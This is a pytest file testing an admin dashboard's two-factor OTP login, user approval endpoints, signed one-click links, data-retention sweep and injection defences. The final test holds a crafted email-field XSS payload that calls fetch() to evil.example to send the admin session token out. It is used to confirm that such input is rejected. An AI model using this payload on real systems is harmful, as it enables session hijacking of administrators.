"""Admin surface: OTP two-factor login, review endpoints, and the sweep."""
import re

import pytest
from fastapi.testclient import TestClient

import proxy.access as access
import proxy.admin as admin
from tests.conftest import TEST_EMAIL, approve_email, session_headers

ADMIN_PASSWORD = "correct-horse-battery-staple"


@pytest.fixture(autouse=True)
def _admin_env(monkeypatch):
    monkeypatch.setenv("ACCESS_SIGNING_SECRET", "test-secret-do-not-use")
    monkeypatch.setenv("ADMIN_TOKEN", ADMIN_PASSWORD)
    # Module-level throttle; without this every test after the first 429s.
    admin._last_otp_request["at"] = 0


def _otp_code(mailbox):
    match = re.search(r"code is (\d{6})", mailbox[-1]["text"])
    assert match, f"no code in {mailbox[-1]['text']!r}"
    return match.group(1)


def admin_login(client, mailbox):
    """Complete the two-factor dance and return the auth header."""
    challenge = client.post("/admin/auth/start",
                            json={"password": ADMIN_PASSWORD}).json()["challenge_id"]
    token = client.post("/admin/auth/verify",
                        json={"challenge_id": challenge,
                              "code": _otp_code(mailbox)}).json()["token"]
    return {"Authorization": "Bearer " + token}


@pytest.fixture
def admin_headers(client, fake_store, no_email):
    return admin_login(client, no_email)


# ── The page itself ──────────────────────────────────────────────────────────

def test_dashboard_is_served(client: TestClient):
    response = client.get("/admin")
    assert response.status_code == 200
    assert "Tracer Lens" in response.text
    # Self-contained: no external fetches, since it must work behind any CSP.
    assert "http://" not in response.text.split("<script>")[-1]


# ── Two-factor login ─────────────────────────────────────────────────────────

def test_wrong_password_is_refused(client: TestClient, fake_store, no_email):
    assert client.post("/admin/auth/start", json={"password": "guess"}).status_code == 401
    assert no_email == [], "a wrong password must not send a code"


def test_missing_admin_token_config_is_a_503(client: TestClient, fake_store, monkeypatch):
    monkeypatch.delenv("ADMIN_TOKEN", raising=False)
    assert client.post("/admin/auth/start", json={"password": "x"}).status_code == 503


def test_correct_password_emails_a_code_to_the_admin(client: TestClient, fake_store, no_email):
    response = client.post("/admin/auth/start", json={"password": ADMIN_PASSWORD})
    assert response.status_code == 200
    assert response.json()["challenge_id"]
    assert no_email[-1]["to"] == access.notify_email()
    assert re.search(r"code is \d{6}", no_email[-1]["text"])


def test_password_alone_is_not_enough(client: TestClient, fake_store, no_email):
    """The whole point of the second factor: the code is required."""
    challenge = client.post("/admin/auth/start",
                            json={"password": ADMIN_PASSWORD}).json()["challenge_id"]
    response = client.post("/admin/auth/verify",
                           json={"challenge_id": challenge, "code": "000000"})
    assert response.status_code == 401


def test_code_brute_force_burns_the_challenge(client: TestClient, fake_store, no_email):
    challenge = client.post("/admin/auth/start",
                            json={"password": ADMIN_PASSWORD}).json()["challenge_id"]
    correct = _otp_code(no_email)

    for _ in range(admin.OTP_MAX_ATTEMPTS):
        client.post("/admin/auth/verify", json={"challenge_id": challenge, "code": "111111"})

    locked = client.post("/admin/auth/verify",
                         json={"challenge_id": challenge, "code": correct})
    assert locked.status_code == 429


def test_expired_challenge_is_rejected(client: TestClient, fake_store, no_email, monkeypatch):
    challenge = client.post("/admin/auth/start",
                            json={"password": ADMIN_PASSWORD}).json()["challenge_id"]
    monkeypatch.setattr(admin, "OTP_TTL_S", -1)
    response = client.post("/admin/auth/verify",
                           json={"challenge_id": challenge, "code": _otp_code(no_email)})
    assert response.status_code == 401


def test_code_works_only_once(client: TestClient, fake_store, no_email):
    challenge = client.post("/admin/auth/start",
                            json={"password": ADMIN_PASSWORD}).json()["challenge_id"]
    code = _otp_code(no_email)
    assert client.post("/admin/auth/verify",
                       json={"challenge_id": challenge, "code": code}).status_code == 200
    assert client.post("/admin/auth/verify",
                       json={"challenge_id": challenge, "code": code}).status_code == 401


def test_repeated_code_requests_are_throttled(client: TestClient, fake_store, no_email):
    client.post("/admin/auth/start", json={"password": ADMIN_PASSWORD})
    assert client.post("/admin/auth/start",
                       json={"password": ADMIN_PASSWORD}).status_code == 429


@pytest.mark.parametrize("path,method", [
    ("/admin/users", "get"),
    ("/admin/runs", "get"),
    ("/admin/pending-count", "get"),
    ("/admin/access/approve", "post"),
    ("/admin/access/deny", "post"),
    ("/admin/extension/approve", "post"),
    ("/admin/user/delete", "post"),
    ("/admin/notify/retry", "post"),
    ("/admin/sweep", "post"),
])
def test_every_admin_endpoint_needs_a_session(client: TestClient, fake_store, path, method):
    response = client.request(method.upper(), path, json={"email": TEST_EMAIL})
    assert response.status_code == 401


def test_a_visitor_session_is_not_an_admin_session(client: TestClient, fake_store, no_email):
    """Signing keys are shared; purposes are what keep the roles apart."""
    approve_email()
    assert client.get("/admin/users", headers=session_headers()).status_code == 401


# ── Review data ──────────────────────────────────────────────────────────────

def test_users_view_reports_pending_and_stats(client: TestClient, fake_store, no_email,
                                              admin_headers):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    approve_email("busy@example.com", tokens_used=50000, runs_total=4, runs_failed=1,
                  latency_ms_sum=8000)

    body = client.get("/admin/users", headers=admin_headers).json()
    assert {u["email"] for u in body["pending"]} == {TEST_EMAIL}

    busy = next(u for u in body["users"] if u["email"] == "busy@example.com")
    assert busy["failure_rate"] == 25.0
    assert busy["avg_latency_ms"] == 2000


def test_failed_notifications_surface_as_alerts(client: TestClient, fake_store, monkeypatch,
                                                no_email):
    headers = admin_login(client, no_email)

    async def always_fails(to, subject, text, html=None):
        return False, "resend 500 boom"

    monkeypatch.setattr(access, "send_email", always_fails)
    client.post("/auth/login", json={"email": TEST_EMAIL})

    alerts = client.get("/admin/users", headers=headers).json()["alerts"]
    assert any(a["kind"] == "notify_failed" and a["email"] == TEST_EMAIL for a in alerts)
    assert "boom" in next(a["detail"] for a in alerts if a["kind"] == "notify_failed")


def test_runs_view_lists_recent_turns(client: TestClient, fake_store, no_email, admin_headers):
    approve_email()
    client.post("/analyze-prompt", json={"prompt": "Hi", "chat_id": "c1"},
                headers=session_headers())

    runs = client.get("/admin/runs", headers=admin_headers).json()["runs"]
    assert len(runs) == 1
    assert runs[0]["ok"] is True
    assert runs[0]["email_hash"] == access.email_key(TEST_EMAIL)
    assert runs[0]["tokens_total"] == 10


def test_pending_count_probe(client: TestClient, fake_store, no_email, admin_headers):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    body = client.get("/admin/pending-count", headers=admin_headers).json()
    assert body["pending"] == 1
    assert body["oldest_age_s"] >= 0


# ── Decisions ────────────────────────────────────────────────────────────────

def test_approve_grants_access_and_emails_a_link(client: TestClient, fake_store, no_email,
                                                 admin_headers):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    no_email.clear()

    response = client.post("/admin/access/approve", json={"email": TEST_EMAIL},
                           headers=admin_headers)
    assert response.status_code == 200
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "approved"

    # Approval doubles as the sign-in email — approve, click, in.
    assert no_email[-1]["to"] == TEST_EMAIL
    assert "?auth=" in no_email[-1]["text"]


def test_deny_blocks_and_tells_them(client: TestClient, fake_store, no_email, admin_headers):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    no_email.clear()

    client.post("/admin/access/deny", json={"email": TEST_EMAIL}, headers=admin_headers)
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "denied"
    assert no_email[-1]["to"] == TEST_EMAIL


def test_extension_approval_adds_a_grant(client: TestClient, fake_store, no_email, admin_headers):
    approve_email(tokens_used=200000, token_limit=200000)
    client.post("/access/extension", json={"message": "more please"},
                headers=session_headers())

    response = client.post("/admin/extension/approve", json={"email": TEST_EMAIL},
                           headers=admin_headers)
    assert response.json()["token_limit"] == 400000
    # And they are unblocked without signing in again.
    assert client.post("/analyze-prompt", json={"prompt": "Hi"},
                       headers=session_headers()).status_code == 200


def test_approve_surfaces_a_failed_send_instead_of_lying(client: TestClient, fake_store,
                                                          admin_headers, monkeypatch):
    """Approving must not report success while the visitor has no way in."""
    client.post("/auth/login", json={"email": TEST_EMAIL})

    async def fails(to, subject, text, html=None):
        return False, "smtp auth rejected"

    monkeypatch.setattr(access, "send_email", fails)

    response = client.post("/admin/access/approve", json={"email": TEST_EMAIL},
                           headers=admin_headers)
    assert response.status_code == 502
    # The status change already stuck — that's the point of the error message:
    # a retry option, not "approval failed" (which would be misleading).
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "approved"
    # Unlike /auth/login's visitor-facing 502, the caller here is already an
    # authenticated admin — the raw transport reason is useful diagnostics,
    # not a leak, so it's fine for it to appear in the detail.
    assert "smtp auth rejected" in response.json()["detail"].lower()


def test_deny_surfaces_a_failed_send(client: TestClient, fake_store, admin_headers, monkeypatch):
    client.post("/auth/login", json={"email": TEST_EMAIL})

    async def fails(to, subject, text, html=None):
        return False, "smtp auth rejected"

    monkeypatch.setattr(access, "send_email", fails)

    response = client.post("/admin/access/deny", json={"email": TEST_EMAIL},
                           headers=admin_headers)
    assert response.status_code == 502
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "denied"


def test_grant_surfaces_a_failed_send(client: TestClient, fake_store, admin_headers, monkeypatch):
    approve_email(tokens_used=200000, token_limit=200000)
    client.post("/access/extension", json={"message": "more please"},
                headers=session_headers())

    async def fails(to, subject, text, html=None):
        return False, "smtp auth rejected"

    monkeypatch.setattr(access, "send_email", fails)

    response = client.post("/admin/extension/approve", json={"email": TEST_EMAIL},
                           headers=admin_headers)
    assert response.status_code == 502
    # The grant itself already landed, same as approve/deny.
    assert access.get_record(TEST_EMAIL, cached=False)["token_limit"] == 400000


def test_admin_act_link_renders_the_failure_not_a_crash(client: TestClient, fake_store,
                                                         monkeypatch):
    """The one-click email link path must not 500 on a failed notification."""
    client.post("/auth/login", json={"email": TEST_EMAIL})

    async def fails(to, subject, text, html=None):
        return False, "smtp auth rejected"

    monkeypatch.setattr(access, "send_email", fails)

    approve = access.sign({"a": "approve", "email": TEST_EMAIL},
                          access.PURPOSE_ADMIN_ACT, access.ADMIN_ACT_TTL_S)
    response = client.get(f"/admin/act?t={approve}")
    assert response.status_code == 502
    assert "text/html" in response.headers["content-type"]
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "approved"


def test_admin_delete_removes_the_user(client: TestClient, fake_store, no_email, admin_headers):
    approve_email()
    client.post("/analyze-prompt", json={"prompt": "Hi", "chat_id": "c1"},
                headers=session_headers())

    response = client.post("/admin/user/delete", json={"email": TEST_EMAIL}, headers=admin_headers)
    assert response.status_code == 200
    assert access.get_record(TEST_EMAIL, cached=False) is None
    assert not [p for p in fake_store.docs if p[0] == "users"]


def test_decisions_reject_malformed_addresses(client: TestClient, fake_store, no_email,
                                              admin_headers):
    assert client.post("/admin/access/approve", json={"email": "nope"},
                       headers=admin_headers).status_code == 400


def test_decision_on_unknown_user_404s(client: TestClient, fake_store, no_email, admin_headers):
    assert client.post("/admin/access/approve", json={"email": "ghost@example.com"},
                       headers=admin_headers).status_code == 404


# ── One-click links from the inbox ───────────────────────────────────────────

def _act_token(action, email, ttl=access.ADMIN_ACT_TTL_S):
    return access.sign({"a": action, "email": email}, access.PURPOSE_ADMIN_ACT, ttl)


def test_one_click_approve_works(client: TestClient, fake_store, no_email):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    response = client.get("/admin/act", params={"t": _act_token("approve", TEST_EMAIL)})
    assert response.status_code == 200
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "approved"


def test_one_click_grant_works(client: TestClient, fake_store, no_email):
    approve_email(tokens_used=200000, token_limit=200000)
    client.get("/admin/act", params={"t": _act_token("grant", TEST_EMAIL)})
    assert access.get_record(TEST_EMAIL, cached=False)["token_limit"] == 400000


def test_tampered_one_click_link_is_refused(client: TestClient, fake_store, no_email):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    token = _act_token("approve", TEST_EMAIL)
    response = client.get("/admin/act", params={"t": token[:-4] + "AAAA"})
    assert response.status_code == 400
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "pending"


def test_expired_one_click_link_is_refused(client: TestClient, fake_store, no_email):
    client.post("/auth/login", json={"email": TEST_EMAIL})
    response = client.get("/admin/act", params={"t": _act_token("approve", TEST_EMAIL, ttl=-1)})
    assert response.status_code == 400
    assert access.get_record(TEST_EMAIL, cached=False)["status"] == "pending"


def test_admin_session_cannot_be_replayed_as_a_one_click_link(client: TestClient, fake_store,
                                                              no_email):
    session = access.sign({"admin": True}, access.PURPOSE_ADMIN_SESSION, 3600)
    assert client.get("/admin/act", params={"t": session}).status_code == 400


# ── Retention sweep ──────────────────────────────────────────────────────────

def test_sweep_deletes_expired_chats_but_keeps_the_access_record(
        client: TestClient, fake_store, no_email, admin_headers, monkeypatch):
    """The 24h promise, enforced. Quota data has to survive it."""
    monkeypatch.setenv("CHAT_RETENTION_HOURS", "0")
    approve_email()
    client.post("/analyze-prompt", json={"prompt": "Hi", "chat_id": "c1"},
                headers=session_headers())
    assert [p for p in fake_store.docs if p[0] == "users"]

    result = client.post("/admin/sweep", headers=admin_headers).json()
    assert result["conversations"] == 1
    assert result["messages"] == 2

    assert not [p for p in fake_store.docs
                if p[0] == "users" and "conversations" in p]
    record = access.get_record(TEST_EMAIL, cached=False)
    assert record["status"] == "approved"
    assert record["tokens_used"] == 10


def test_sweep_leaves_live_chats_alone(client: TestClient, fake_store, no_email, admin_headers):
    approve_email()
    client.post("/analyze-prompt", json={"prompt": "Hi", "chat_id": "c1"},
                headers=session_headers())

    assert client.post("/admin/sweep", headers=admin_headers).json()["conversations"] == 0
    assert client.get("/history/c1", headers=session_headers()).status_code == 200


def test_sweep_expires_old_run_metrics(client: TestClient, fake_store, no_email, admin_headers,
                                       monkeypatch):
    monkeypatch.setenv("RUN_METRICS_RETENTION_DAYS", "0")
    approve_email()
    client.post("/analyze-prompt", json={"prompt": "Hi", "chat_id": "c1"},
                headers=session_headers())

    assert client.post("/admin/sweep", headers=admin_headers).json()["runs"] == 1
    assert not [p for p in fake_store.docs if p[0] == access.RUNS_COLLECTION]


def test_notify_retry_recovers_a_dropped_email(client: TestClient, fake_store, monkeypatch,
                                               no_email):
    headers = admin_login(client, no_email)
    outcomes = iter([(False, "resend 500"), (True, "")])

    async def flaky(to, subject, text, html=None):
        return next(outcomes)

    monkeypatch.setattr(access, "send_email", flaky)
    client.post("/auth/login", json={"email": TEST_EMAIL})
    assert access.get_record(TEST_EMAIL, cached=False)["notify_state"] == "failed"

    assert client.post("/admin/notify/retry", headers=headers).json()["recovered"] == 1
    assert access.get_record(TEST_EMAIL, cached=False)["notify_state"] == "sent"


# ── Dashboard injection ──────────────────────────────────────────────────────

def test_dashboard_never_interpolates_an_email_into_an_inline_handler(
        client: TestClient):
    """The escaping that used to guard these rows could not work where it sat.

    esc() maps ' to &#39;, but inside a double-quoted HTML attribute the parser
    entity-decodes that back to a quote *before* the JS is parsed — so
    onclick="approve('...')" was breakable by anyone who could get a crafted
    address stored, which is any unauthenticated visitor via POST /auth/login.
    Row actions now carry the address as data and are dispatched by a delegated
    listener, so the value is never parsed as JS.
    """
    html = client.get("/admin").text
    for action in ("approve", "deny", "grant", "del"):
        assert f'onclick="{action}(' not in html
        assert f'data-act="{action}"' in html


def test_a_crafted_address_cannot_reach_the_dashboard(
        client: TestClient, fake_store, no_email, admin_headers):
    """Defence in depth: the payload is rejected at the front door too."""
    payload = ("a');fetch('https://evil.example/?t='+"
               "sessionStorage.getItem('tl-admin-token'));//x@attacker.com")
    assert client.post("/auth/login", json={"email": payload}).status_code == 400

    listed = client.get("/admin/users", headers=admin_headers).json()
    assert not [u for u in listed["pending"] if "fetch(" in u["email"]]
